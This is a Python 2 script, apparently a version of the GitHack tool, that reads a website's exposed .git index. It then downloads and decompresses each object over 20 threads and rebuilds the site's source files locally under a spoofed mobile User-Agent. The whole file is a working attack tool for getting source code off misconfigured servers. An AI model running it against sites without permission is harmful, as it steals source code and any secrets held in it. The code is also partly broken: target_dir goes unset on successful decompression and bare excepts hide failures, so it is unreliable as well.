#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import sys
import urllib2
import os
import urlparse
import zlib
import threading
import Queue
import re
import time
from libhhd.parser import parse

class Scanner(object):
    def __init__(self,u):
        self.base_url = u
        self.domain = urlparse.urlparse(u).netloc.replace(':', '_')
        if not os.path.exists(self.domain):
            os.mkdir(self.domain)
        try:
            data = self._request_data(u + '/index')
        except:
            pass
        with open('index', 'wb') as f:
            f.write(data)
        self.queue = Queue.Queue()
        for entry in parse('index'):
            if "sha1" in entry.keys():
                self.queue.put((entry["sha1"].strip(), entry["name"].strip()))
                try:
                    print entry['name']
                except:
                    pass
        self.lock = threading.Lock()
        self.thread_count = 20
        self.STOP_ME = False
        self.file_name=None

    def _request_data(self, url):
        request = urllib2.Request(url, None, {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X)'})
        return urllib2.urlopen(request).read()

    def _print(self, msg):
        self.lock.acquire()
        print msg
        self.lock.release()

    def get_back_file(self):
        while not self.STOP_ME:
            try:
                sha1, file_name = self.queue.get(timeout=0.5)
            except:
                pass
            for i in range(3):
                try:
                    folder = '/objects/%s/' % sha1[:2]
                    data = self._request_data(self.base_url + folder + sha1[2:])
                    try:
                        data = zlib.decompress(data)
                    except:
                        self._print('[Error] Fail to decompress %s' % file_name)
                        data = re.sub('blob \d+\00', '', data)
                        target_dir = os.path.join(self.domain, os.path.dirname(file_name) )
                    if target_dir and not os.path.exists(target_dir):
                        os.makedirs(target_dir)
                    with open( os.path.join(self.domain, file_name) , 'wb') as f:
                        f.write(data)
                    self._print('[OK] %s' % file_name)
                    break
                except urllib2.HTTPError, e:
                    pass
                except Exception, e:
                    pass
        self.exit_thread()

    def exit_thread(self):
        self.lock.acquire()
        self.thread_count -= 1
        self.lock.release()

    def scan(self):
        for i in range(self.thread_count):
            t = threading.Thread(target=self.get_back_file)
            t.start()

def githack(u):
        s = Scanner(u)
        s.scan()
        p=[]
        a=urlparse.urlparse(u).netloc.replace(':', '_')
        p.append(a)
        print(p)
        return p
